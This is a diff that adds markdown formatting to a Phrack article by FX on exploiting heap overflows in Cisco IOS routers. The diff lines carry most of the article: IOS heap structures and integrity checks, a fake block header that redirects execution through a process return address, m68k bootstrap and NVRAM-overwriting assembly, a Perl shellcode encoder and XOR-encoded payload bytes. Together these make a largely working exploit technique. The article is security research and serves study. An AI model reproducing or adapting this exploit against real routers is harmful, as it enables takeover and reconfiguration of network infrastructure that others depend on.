@@ -1,5 +1,5 @@
-# SOURCE: http://phrack.org/issues/60/7.html  
-# AUTHOR: FX  
+### SOURCE: http://phrack.org/issues/60/7.html  
+### AUTHOR: FX  
   
                              ==Phrack Inc.==  
   
@@ -57,7 +57,7 @@ identifying an overflow in IOS. As yours truly already mentioned, most
 overflows are heap based. There are two different ways in IOS to identify  
 a heap overflow when it happens. Being connected to the console, the  
 reader might see output like this:  
-  
+```  
 01:14:16: %SYS-3-OVERRUN: Block overrun at 2C01E14 (red zone 41414141)  
 -Traceback= 80CCC46 80CE776 80CF1BA 80CF300  
 01:14:16: %SYS-6-MTRACE: mallocfree: addr, pc  
@@ -68,7 +68,7 @@ reader might see output like this:
   20AFCF8,80CA1C6   205A664,80CA1D8   20AC56C,80CA1C6   20B1A88,80CA1C6  
 01:14:16: %SYS-6-BLKINFO: Corrupted redzone blk 2C01E14, words 382,  
   alloc 80ABBFC, InUse, dealloc 206E2F0, rfcnt 1  
-  
+```  
 In this case, an IOS process called "Check heaps", of which we will hear  
 a lot more later, has identified a problem in the heap structures. After  
 doing so, "Check heaps" will cause what we call a software forced crash.  
@@ -80,7 +80,7 @@ what Cisco calls a "RED ZONE", which in fact is just a static canary.
   
 The other way a heap overflow could manifest itself on your console is an  
 access violation:  
-  
+```  
 *** BUS ERROR ***  
 access address = 0x5f227998  
 program counter = 0x80ad45a  
@@ -88,7 +88,7 @@ status register = 0x2700
 vbr at time of exception = 0x4000000  
 special status word = 0x0045  
 faulted cycle was a longword read  
-  
+```  
 This is the case when you are lucky and half of the work is already done.  
 IOS used a value that you somehow influenced and referenced to not  
 readable memory.  Unfortunately, those overflows are later harder to  
@@ -119,7 +119,7 @@ blocks are hold together in a linked list structure and store their
 management information mostly inline. This means, every memory block has  
 a header, which contains information about the block, it's previous one  
 and the next one in the list.  
-  
+```  
      +--------------+  
  .-- | Block A      | <-.  
  |   +--------------+   |  
@@ -127,14 +127,14 @@ and the next one in the list.
      +--------------+  
      | Block C      |  
      +--------------+  
-  
+```  
 The command "show memory processor" clearly shows the linked list  
 structure.  
   
 A memory block itself consists of the block header with all the inline  
 management information, the data part where the actual data is stored  
 and the red zone, which we already encountered. The format is as follows:  
-  
+```  
  |<-  32 bit  ->|        Comment  
  +--------------+  
  | MAGIC        |        Static value 0xAB1234CD  
@@ -164,7 +164,7 @@ and the red zone, which we already encountered. The format is as follows:
  +--------------+  
  | RED ZONE     |        Static value 0xFD0110DF  
  +--------------+  
-  
+```  
 In case this memory block is used, the size field will have it's most  
 significant bit set to one. The size is represented in words (2 bytes),  
 and does not include the block overhead. The reference count field is  
@@ -174,7 +174,7 @@ or 0. Also, there seem to be no checks for this field in place.
   
 In case the memory block is not used, some more management data is  
 introduced at the point where the real data was stored before:  
-  
+```  
  | [BLOCK HEAD] |  
  +--------------+  
  | MAGIC2       |        Static value 0xDEADBEEF  
@@ -195,7 +195,7 @@ introduced at the point where the real data was stored before:
  +--------------+  
  | RED ZONE     |        Static value 0xFD0110DF  
  +--------------+  
-  
+```  
 Therefore, a free block is an element in two different linked lists:  
 One for the blocks in general (free or not), another one for the list of  
 free memory blocks. In this case, the reference count will be zero and  
@@ -210,17 +210,17 @@ linked lists of blocks. It basically walks them down from top to buttom to
 see if everything is fine. The tests employed seem to be pretty extensive  
 compared to common operating systems such as Linux. As far as yours truly  
 knows, this is what it checks:  
-	1) Doest the block being with MAGIC (0xAB1234CD)?  
-	2) If the block is in use (MSB in size field is set), check if the  
+  1) Doest the block being with MAGIC (0xAB1234CD)?  
+  2) If the block is in use (MSB in size field is set), check if the  
 	   red zone is there and contains 0xFD0110DF.  
-	3) Is the PREV pointer not NULL?  
-	4) If there is a NEXT pointer ...  
-	4.1) Does it point right after the end of this block?  
-	4.2) Does the PREV pointer in the block pointed to by NEXT point  
+  3) Is the PREV pointer not NULL?  
+  4) If there is a NEXT pointer ...  
+   4.1) Does it point right after the end of this block?  
+   4.2) Does the PREV pointer in the block pointed to by NEXT point  
 	     back to this block's NEXT pointer?  
-	5) If the NEXT pointer is NULL, does this block end at a memory  
+  5) If the NEXT pointer is NULL, does this block end at a memory  
 	   region/pool boundary [NOTE: not sure about this one].  
-	6) Does the size make sense? [NOTE: The exact test done here is  
+  6) Does the size make sense? [NOTE: The exact test done here is  
 	   still unknown]  
   
 If one of these tests is not satisfied, IOS will declare itself unhappy and  
@@ -252,7 +252,7 @@ The PREV pointer has to be correct. Yours truly has not found any way to
 use arbitrary values here. The check outlined in the checklist as 4.2 is a  
 serious problem, since it is done on the block we are sitting in - not the  
 one we are overflowing. To illustrate the situation:  
-  
+```  
      +--------------+  
      | Block Head   |  
      ...  
@@ -264,7 +264,7 @@ one we are overflowing. To illustrate the situation:
      +==============+  
      | Block Head   |  
      ...  
-  
+```  
 We will call the uppermost block, who's data part we are overflowing, the  
 "host block", because it basically "hosts" our evildoing. For the sake of  
 clarity, we will call the overwritten block header the "fake block", since  
@@ -347,7 +347,7 @@ In the IOS memory list, there is an element called the "Process Array".
 This is a list of pointers - one for every process currently running in  
 IOS. You can find it's location by issuing a "show memory processor  
 allocating-process" command (output trimmed):  
-  
+```  
 radio#show memory processor allocating-process  
   
           Processor memory  
@@ -360,9 +360,9 @@ radio#show memory processor allocating-process
 258FDCC   1000 258F998 25901E0   1  Load Meter 20E54BA   Process Stack  
 25901E0    488 258FDCC 25903F4   1  Load Meter 20E54CC   Process  
 25903F4    128 25901E0 25904A0   1  Load Meter 20DD1CE   Process Events  
-  
+```  
 This "Process Array" can be displayed by the "show memory" command:  
-  
+```  
 radio#show memory 0x258F998  
 0258F990:                   AB1234CD FFFFFFFE          +.4M...~  
 0258F9A0: 00000000 020E50B6 020E5108 0258FDCC  ......P6..Q..X}L  
@@ -378,7 +378,7 @@ radio#show memory 0x258F998
 0258FA40: 02657830 02657B48 02657E60 0269DCFC  .ex0.e{H.e~`.i\|  
 0258FA50: 0269EFE0 026A02C4 025DD870 00000000  .io`.j.D.]Xp....  
 0258FA60: 00000000 025C3358 026695EC 0266A370  .....\3X.f.l.f#p  
-  
+```  
 While you also see the already discussed block header format in action now,  
 the interesting information starts at 0x0258F9C4. Here, you find the number  
 of processes currently running on IOS. They are ordered by their process  
@@ -389,22 +389,22 @@ so that the location we are overwriting is static. For this reason, yours
 truly picked the "Load Meter" process, which is there to measure the system  
 load and is fired off about every 30 seconds. Let's get the PID of  
 "Load Meter":  
-  
+```  
 radio#show processes cpu  
 CPU utilization for five seconds: 2%/0%; one minute: 3%; five minutes: 3%  
  PID  Runtime(ms)  Invoked  uSecs    5Sec   1Min   5Min TTY Process  
    1          80      1765     45   0.00%  0.00%  0.00%   0 Load Meter  
-  
+```  
 Well, conveniently, this process has PID 1. Now, we check the memory  
 location the "Process Array" points to. Yours truly calls this memory  
 location "process record", since it seems to contain everything IOS needs  
 to know about the process. The first two entries in the record are:  
-  
+```  
 radio#sh mem 0x02590208  
 02590200:                   0258FDF4 025901AC          .X}t.Y.,  
 02590210: 00001388 020E488E 00000000 00000000  ......H.........  
 02590220: 00000000 00000000 00000000 00000000  ................  
-  
+```  
 The first entry in this record is 0x0258FDF4, which is the process stack.  
 You can compare this to the line above that says "Load Meter" and "Process  
 Stack" on it in the output of "show memory processor allocating-process".  
@@ -413,11 +413,11 @@ The second element is the current stack pointer of this process
 with low activity. But surprisingly, the same procedure also works quite  
 well with busier processes such as "IP Input". Inspecting the location of  
 the stack pointer, we see something quite familiar:  
-  
+```  
 radio#sh mem 0x025901AC  
 025901A0:                            025901C4              .Y.D  
 025901B0: 020DC478 0256CAF8 025902DE 00000000  ..Dx.VJx.Y.^....  
-  
+```  
 This is classic C calling convention: first we find the former frame  
 pointer and then we find the return address. Therefore, 0x025901B0 is the  
 address we are targeting to overwrite with a pointer supplied by us.  
@@ -434,7 +434,7 @@ that this is actually a static number in this case. There are other, more
 advanced methods to deliver the code to the device, but let's keep focused.  
   
 The TFTP filename we are asking for should now have the form of:  
-  
+```  
  +--------------+  
  | AAAAAAAAAAAA |  
  ...  
@@ -449,10 +449,10 @@ The TFTP filename we are asking for should now have the form of:
  |              |  
  ....  
  +--------------+  
-  
+```  
 At this point, we can build the fake block using all the information we  
 gathered:  
-  
+```  
     char                fakeblock[] =  
         "\xFD\x01\x10\xDF"      // RED  
         "\xAB\x12\x34\xCD"      // MAGIC  
@@ -475,15 +475,15 @@ gathered:
         "\x02\x0F\x2A\x24"      // FREE NEXT (in BUFFER)  
         "\x02\x59\x01\xB0"      // FREE PREV (Load Meter return addr)  
         ;  
-  
+```  
 When sending this to the Cisco, you are likely to see something like this:  
-  
+```  
 *** EXCEPTION ***  
 illegal instruction interrupt  
 program counter = 0x20f2a24  
 status register = 0x2700  
 vbr at time of exception = 0x4000000  
-  
+```  
 depending on what comes after your fake block header. Of course, we did not  
 provide code for execution yet. But at this point in time, we got the CPU  
 redirected into our buffer.  
@@ -574,7 +574,7 @@ bootstrap code will decode the main code and pass execution on to it. The
 Cisco 1600 platform with it's 68360 does not have any caching issues to  
 worry us (thanks to LSD for pointing this out), so the only issue we have  
 is avoiding 0x00 bytes in the bootstrap code. Here is how it works:  
-  
+```  
 --- bootstrap.s ---  
 	.globl _start  
 _start:  
@@ -613,9 +613,9 @@ broken_branch:
 xor_code:  
   
 --- end bootstrap.s ---  
-  
+```  
 You may assemble the code into an object file using:  
-linux# m68k-aout-as -m68360 -pic --pcrel -o bootstrap.o bootstrap.s  
+`linux# m68k-aout-as -m68360 -pic --pcrel -o bootstrap.o bootstrap.s`  
   
 There are a few things to say about the code. Number one are the first two  
 instructions. The CPU we are dealing with supports write protection for  
@@ -644,7 +644,7 @@ When this code completed execution, the appended XOR'd code and config
 should be in memory in all clear text/code. The only thing we have to do  
 now is copy the config in the NVRAM. Here is the appropriate code to do  
 this:  
-  
+```  
 --- config_copy.s ---  
         .globl  _start  
 _start:  
@@ -691,7 +691,7 @@ CPUReset:
   
 config:  
 --- end config_copy.s ---  
-  
+```  
 There is no particular magic about this part of the code. The only thing  
 worth noticing is the final CPU reset. There is reason why we do this. If  
 we just crash the router, there might be exception handlers in place to  
@@ -705,7 +705,7 @@ The config_copy code and the config itself must now be XOR encoded with the
 pattern we used in the bootstrap code. Also, you may want to put the code  
 into a nice char array for easy use in a C program. For this, yours truly  
 uses a dead simple but efficient Perl script:  
-  
+ ``` 
 --- objdump2c.pl ---  
 #!/usr/bin/perl  
   
@@ -735,7 +735,7 @@ while (<STDIN>) {
     }  
 }  
 --- end objdump2c.pl ---  
-  
+```  
 You can use the output of objdump and pipe it into the script. If the  
 script got no parameter, it will produce the C char string without  
 modifications. The first optional paramter will be your XOR pattern and the  
@@ -746,7 +746,7 @@ Cisco unhappy.
   
 The output for our little config_copy.s code XOR'd with 0xD5 looks like  
 this (trimmed for phrack):  
-  
+```  
 linux# m68k-aout-objdump -d config_copy.o |  
 > ./objdump2XORhex.pl 0xD5 0x020F2A24  
   
@@ -774,11 +774,11 @@ linux# m68k-aout-objdump -d config_copy.o |
 "\xF5\xA9\xDA\x25\xD5\xD1"      //moveal #267386884,%a0 (0x020F2A7C)  
 "\xF5\x85"                      //moveal %a0@,%a0 (0x020F2A82)  
 "\x9B\x05"                      //jmp %a0@ (0x020F2A84)  
-  
+```  
 Finally, there is only one more thing to do before we can compile this all  
 together: new have to create the new NVRAM header and calculate the  
 checksum for our new config. The NVRAM header has the form of:  
-  
+```  
 typedef struct {  
     u_int16_t       magic;  	// 0xABCD  
     u_int16_t       one;	// Probably type (1=ACII, 2=gz)  
@@ -789,7 +789,7 @@ typedef struct {
 				// memory after config  
     u_int32_t       size;  
 } nvhdr_t;  
-  
+```  
 Obviously, most values in here are self-explainory. This header is not  
 nearly as much tested as the memory structures, so IOS will forgive you  
 strange values in the cfg_end entry and such. You can choose the IOS  
@@ -801,7 +801,7 @@ the checksum field itself being set to zero. This is a standard one's
 complement checksum as you find in any IP implementation.  
   
 When putting it all together, you should have something along the lines of:  
-  
+```  
  +--------------+  
  | AAAAAAAAAAAA |  
  ...  
@@ -824,7 +824,7 @@ When putting it all together, you should have something along the lines of:
  |   XOR pat    |  
  ....  
  +--------------+  
-  
+```  
 ...which you can now send to the Cisco router for execution. If everything  
 works the way it is planned, the router will seemingly freeze for some  
 time, because it's working the slow loops for NVRAM copy and does not allow  
